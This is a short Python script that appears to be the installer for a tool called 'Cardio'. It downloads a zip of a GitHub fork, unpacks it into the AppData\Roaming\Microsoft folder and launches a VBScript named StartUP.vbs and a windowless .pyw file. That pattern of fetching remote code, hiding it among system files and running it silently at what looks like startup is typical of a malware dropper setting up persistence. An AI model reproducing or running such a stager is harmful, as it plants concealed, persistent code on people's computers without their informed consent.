import urllib.request
import os
import sys
import subprocess
print("#-----------------------------------------------------------------------------------#")
print("You must fork the repository to begin with and then enter your username here exactly!")
print("#-----------------------------------------------------------------------------------#")
USER = input("GitHub USERNAME :")
urllib.request.urlretrieve(f"https://github.com/{USER}/Cardio/archive/refs/heads/main.zip", "Cardio.zip")
subprocess.Popen('cd C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft & copy Cardio.zip C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft & powershell -command "Expand-Archive Cardio.zip" & cd C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Cardio\\Cardio-main & start StartUP.vbs & start Message.pyw & exit', shell=True)
